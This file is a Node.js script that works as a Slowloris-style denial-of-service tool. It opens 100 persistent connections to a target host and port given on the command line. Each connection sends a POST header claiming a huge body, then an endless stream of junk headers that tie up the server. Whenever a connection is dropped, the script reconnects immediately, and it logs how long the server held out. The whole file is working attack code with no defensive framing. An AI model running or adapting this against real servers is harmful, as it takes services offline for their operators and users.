const net = require('net');
const { PerformanceObserver, performance } = require('perf_hooks');
const uuidv4 = require('uuid/v4');
const { argv } = require('yargs');

// Handle a lot of simultaneous connections and hold them tight.
const CONNECTIONS = 100;

performance.clearMarks();
const obs = new PerformanceObserver(items => {
  const timing = items.getEntries()[0];
  console.log(`[${timing.name}] Time passed before server refused : ${timing.duration} ms`);
  performance.clearMarks(timing.name);
});
obs.observe({ entryTypes: ['measure'] });

net.Socket.prototype.writeAsync = function (data) {
  return new Promise(resolve => {
    this.write(data, resolve);
  });
};

class Connection {
  constructor(number, host, port) {
    this.number = number;
    this.host = host;
    this.port = port;
    this.state = 'ready';
    this.socket = null;
    this.headersCount = 0
  }

  go() {
    this.uuid = uuidv4();
    this.state = 'going';
    this._initSocket();
  }

  end() {
    // console.log(`Sent ${this.headersCount} headers`);
    this.state = 'end';
    const endMark = this.uuid + '-end';
    performance.mark(endMark);
    performance.measure(this.uuid, this.uuid, endMark);
    this.go();
  }

  _initSocket() {
    this.socket = net.connect(this.port, this.host, async () => {
      await this.socket.writeAsync(`
        POST  HTTP/1.1
        Host: ${this.host}
        Content-Length: 9999999
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: no-cache
      `.trim());

      performance.mark(this.uuid);

      try {
        for (this.headersCount = 0; this.headersCount < Infinity; this.headersCount++) {
          await this.socket.writeAsync(`
            X-Shit-${this.headersCount}: IWillDragYouDown
          `.trim());
        }
      } catch (err) {
        this.socket.end();
        this.end();
      }
    });
    this.socket.on('data', data => {
      this.socket.end();
      this.end();
    });
    this.socket.on('error', () => {
      this.end();
    });
    this.socket.on('close', () => {
      this.end();
    });
    this.socket.on('end', () => {
      this.end();
    });
  }
}

(async () => {

  const { host, port } = argv;

  for (let i = 0; i < CONNECTIONS; i++) {
    const conn = new Connection(i, host, port);
    conn.go();
  }

})()
  .catch(console.error.bind(console));
